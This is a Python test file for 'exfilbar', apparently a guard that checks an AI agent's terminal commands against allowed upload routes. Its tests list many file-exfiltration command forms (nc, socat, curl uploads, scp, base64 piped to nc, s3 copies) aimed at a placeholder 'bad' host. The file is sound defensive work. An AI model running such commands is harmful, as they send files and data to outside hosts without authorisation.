"""Coverage-contract and user-output review, with inert strings and temporary stores."""
from contextlib import closing, redirect_stdout
from io import StringIO
from pathlib import Path
from tempfile import TemporaryDirectory
import sqlite3
import unittest
from unittest.mock import patch

from exfilbar.__main__ import main
from exfilbar.ledger import Ledger, format_feed
from exfilbar.parse import parse
from exfilbar.policy import Policy
from exfilbar.report import format_verdict
from support import Context, admission_clock, entry


class ContractReviewTests(unittest.TestCase):
    def test_routable_terminal_rows_and_user_blocks(self):
        forms = (
            ('scp SOURCE HOST:up', 'good:up'),
            ('rsync SOURCE rsync://HOST/module', 'rsync://good/module'),
            ('curl -F file=@SOURCE https://HOST/up', 'https://good/up'),
            ('curl -T SOURCE ftp://HOST/up', 'ftp://good/up'),
            ('wget --method=PUT --body-file=SOURCE https://HOST/up', 'https://good/up'),
            ('http --multipart POST https://HOST/up file@SOURCE;type=text/plain', 'https://good/up'),
            ('nc HOST 9 < SOURCE', 'good:9'),
            ('netcat HOST 9 < SOURCE', 'good:9'),
            ('ncat HOST 9 < SOURCE', 'good:9'),
            ('socat FILE:SOURCE TCP:HOST:9',
             'TCP:good:9'),
            ('socat OPEN:SOURCE,rdonly TCP4:HOST:9',
             'TCP4:good:9'),
            ('ssh HOST cat < SOURCE', 'good'),
            ('mail user@HOST < SOURCE', 'user@good'),
            ('mailx user@HOST < SOURCE', 'user@good'),
            ('base64 SOURCE | nc HOST 9', 'good:9'),
            ('gh release upload v1 SOURCE -R org/HOST', 'https://github.com/org/good'),
            ('aws s3 cp SOURCE s3://HOST/up', 's3://good/up'),
            ('aws s3 mv SOURCE s3://HOST/up', 's3://good/up'),
        )
        for form, target in forms:
            for unresolved in (True, False):
                policy = Policy(block_unresolved=unresolved, routes=[
                    dict(paths=['reports/**'], to=[target])])
                for source, host in (('reports/x', 'good'), ('reports/x', 'bad'), ('private/x', 'good')):
                    # Quote HTTPie metadata so it stays a shell argument.
                    command = form.replace('SOURCE', source).replace('HOST', host)
                    command = command.replace('file@' + source + ';type=text/plain',
                                              "'file@" + source + ";type=text/plain'")
                    with self.subTest(command=command, unresolved=unresolved):
                        records = parse(command)
                        self.assertTrue(records)
                        self.assertFalse(any(t.unresolved for t in records))
                        verdict = policy.evaluate(command)
                        self.assertEqual(verdict.blocked, host == 'bad' or source.startswith('private/'))
                        message = format_verdict(verdict)
                        if host == 'bad':
                            self.assertIn('off route; allowed hosts:', message)
                            if form.startswith('gh '):
                                self.assertIn('check destination scheme, path, port or user in route settings', message)
                            else:
                                self.assertIn('allowed hosts: good', message)
                                self.assertIn('bad', message)
                        if source.startswith('private/'):
                            self.assertIn('protected path rule', message)

    def test_urlencoded_inline_content_is_not_a_file(self):
        policy = Policy(routes=[dict(paths=['**'], to=['https://good/up'])])
        for content in ('email=user@example.org', '=user@example.org', 'note=hi@private/x', 'field@private/a=b'):
            command = 'curl --data-urlencode ' + content + ' https://bad/up'
            self.assertEqual(parse(command), [], command)
            self.assertFalse(policy.evaluate(command).blocked)
        for operand in ('@private/x', 'field@private/x'):
            command = 'curl --data-urlencode ' + operand + ' https://good/up'
            self.assertEqual(Policy(block_unresolved=False).evaluate(command).reason, 'protected path rule')

    def test_same_host_route_denials_explain_hidden_components(self):
        policy = Policy(routes=[dict(paths=['reports/**'], to=['https://good:443/reports/*'])])
        for destination in ('https://good:443/other/x', 'https://good:8443/reports/x',
                            'http://good:443/reports/x'):
            verdict = policy.evaluate('curl -T reports/x ' + destination)
            self.assertTrue(verdict.blocked)
            self.assertIn('check destination scheme, path, port or user in route settings', format_verdict(verdict))

    def test_socat_hosts_in_hook_check_routes_and_feed(self):
        plugin = entry()
        ctx = Context(routes=[dict(paths=['reports/**'], to=['TCP:good:9'])])
        plugin.register(ctx)
        command = 'socat FILE:reports/x TCP:bad:9'
        with admission_clock(type(plugin.Ledger())):
            message = ctx.hooks['pre_tool_call']('terminal', {'command': command}, session_id='r7')['message']
        self.assertIn('allowed hosts: good', message)
        self.assertIn('destination=tcp://bad', message)
        self.assertEqual(ctx.commands['exfil']('check ' + command), message.replace('Exfilbar', 'dry run', 1))
        self.assertIn('allowed hosts: good', ctx.commands['exfil']('routes'))
        self.assertIn('tcp://bad', ctx.commands['exfil']('status', session_id='r7'))

    def test_uncertainty_messages_do_not_blame_a_known_source(self):
        commands = ('curl -L -T reports/x https://good/up',
                    'http --follow POST https://good/up @reports/x',
                    'gh release upload v1 reports/x',
                    'aws s3 cp reports/x s3://good/up --endpoint-url https://good')
        for unresolved in (True, False):
            for command in commands:
                policy = Policy(block_unresolved=unresolved)
                verdict = policy.evaluate(command)
                self.assertEqual(verdict.blocked, unresolved)
                message = format_verdict(verdict)
                self.assertIn('unresolved transfer', message)
                self.assertIn('README Coverage', message)
                self.assertNotIn('unresolved source', message)
                if not unresolved:
                    self.assertIn('explicit pass setting', message)
                with TemporaryDirectory() as directory:
                    ledger = Ledger(directory)
                    ledger.record('r7', 'terminal', policy.inspection)
                    self.assertIn('unresolved transfer', format_feed(ledger.read('r7')))

    def test_absent_history_is_unavailable_in_cli_and_slash(self):
        plugin = entry()
        ctx = Context()
        plugin.register(ctx)
        directory = Path(plugin._test_directory.name)
        # Registering can mirror routes but does not create a decision chain.
        (directory / 'egress.db').unlink(missing_ok=True)
        for required in (False, True):
            ctx.settings['integrity_hmac'] = required
            self.assertIn('Verification unavailable', ctx.commands['exfil']('verify'))
            argv = ['exfilbar', 'verify', '--data-dir', str(directory)]
            if required:
                argv.append('--require-hmac')
            with patch('sys.argv', argv), redirect_stdout(StringIO()) as output:
                self.assertEqual(main(), 2)
            self.assertIn('Verification unavailable', output.getvalue())
            self.assertNotIn('chain intact', output.getvalue())
            self.assertFalse((directory / 'egress.db').exists())
            self.assertFalse((directory / 'integrity.key').exists())
        with closing(sqlite3.connect(directory / 'egress.db')):
            pass
        before = (directory / 'egress.db').read_bytes()
        self.assertIn('Verification unavailable', ctx.commands['exfil']('verify'))
        self.assertEqual((directory / 'egress.db').read_bytes(), before)


if __name__ == '__main__':
    unittest.main()
